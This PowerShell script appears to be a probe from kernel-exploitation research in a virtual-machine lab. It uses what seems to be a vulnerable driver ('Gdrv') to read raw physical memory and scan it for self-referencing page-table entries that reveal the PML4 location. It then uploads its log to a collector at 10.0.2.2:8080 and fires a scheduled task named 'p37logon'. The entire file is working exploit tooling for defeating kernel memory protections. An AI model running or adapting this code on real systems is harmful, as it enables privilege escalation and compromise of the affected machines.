# probeB.ps1 - VARIANT B (predicate variant): is there a self-referencing entry at ANY of 0..511?
#   also counts controls: pages whose entry[0] is present (every real PML4 must be)
$ErrorActionPreference = 'Continue'
[Net.ServicePointManager]::Expect100Continue = $false
$base = 'http://10.0.2.2:8080'
$d = $PSScriptRoot
$log = New-Object System.Collections.ArrayList
function L([string]$s) { $log.Add($s) | Out-Null }
try { Add-Type -Path (Join-Path $d 'p37_prov.cs') } catch { L ('COMPILE FAIL ' + $_.Exception.Message); $log -join "`r`n" | Set-Content "$d\probeB.out"; exit 1 }
$g = [IntPtr]::Zero
$e = [P37Prov]::GdrvOpen([ref]$g)
L ('open=' + $e)
if ($e -ne '') { $log -join "`r`n" | Set-Content "$d\probeB.out"; exit 1 }

$hist = @{}; $selfPages = 0; $e0present = 0; $e0low = 0; $hits = @(); $pages = 0
$t0 = Get-Date
for ($pa = [uint64]0x4000000; $pa -lt [uint64]0x40000000; $pa += 0x10000) {
    try { $b = [P37Prov]::GdrvReadOneRaw($g, $pa, 0x10000) } catch { continue }
    $pages++
    for ($o = 0; $o -lt 0x10000; $o += 0x1000) {
        $page = $pa + [uint64]$o
        $ev0 = [BitConverter]::ToUInt64($b, $o)
        if (($ev0 -band 1) -ne 0) {
            $e0present++
            if ($hits.Count -lt 6 -and ($ev0 -band 0x000FFFFFFFFFF000L) -eq 0) { $e0low++ }
        }
        for ($i = 0; $i -lt 512; $i++) {
            $ev = [BitConverter]::ToUInt64($b, $o + $i * 8)
            if ($ev -ne 0 -and (($ev -band 0x000FFFFFFFFFF000L) -eq $page)) {
                $selfPages++
                if ($hist.ContainsKey($i)) { $hist[$i]++ } else { $hist[$i] = 1 }
                if ($hits.Count -lt 10) { $hits += ('page=0x{0:x} idx=0x{1:x} entry=0x{2:x}' -f $page, $i, $ev) }
            }
        }
    }
}
$secs = ((Get-Date) - $t0).TotalSeconds
L ('sweep pages={0} pages_with_entry0_present={1} selfref_pages={2} in {3:N1}s' -f ($pages * 16), $e0present, $selfPages, $secs)
L ('suspicious_entry0_zero_pa={0}' -f $e0low)
$top = $hist.GetEnumerator() | Sort-Object Value -Descending | Select-Object -First 12
foreach ($t in $top) { L ('  idx 0x{0:x}: {1} pages' -f [int]$t.Key, [int]$t.Value) }
foreach ($h in $hits) { L ('  HIT ' + $h) }
if ($selfPages -gt 0) { L 'VERDICT: generalized self-reference EXISTS (PML4 findable without 0x1ED)' } else { L 'VERDICT: no self-reference at any index' }

$body = $log -join "`r`n"
Set-Content -LiteralPath "$d\probeB.out" -Value $body
$tag = 'x'
try { $tag = (New-Object Net.WebClient).DownloadString("$base/active.txt").Trim() } catch { }
try { (New-Object Net.WebClient).UploadString("$base/log?vm=$tag", ("## probeB`r`n" + $body)) } catch { }
Start-Sleep -Seconds 12
& schtasks.exe /run /tn p37logon | Out-Null
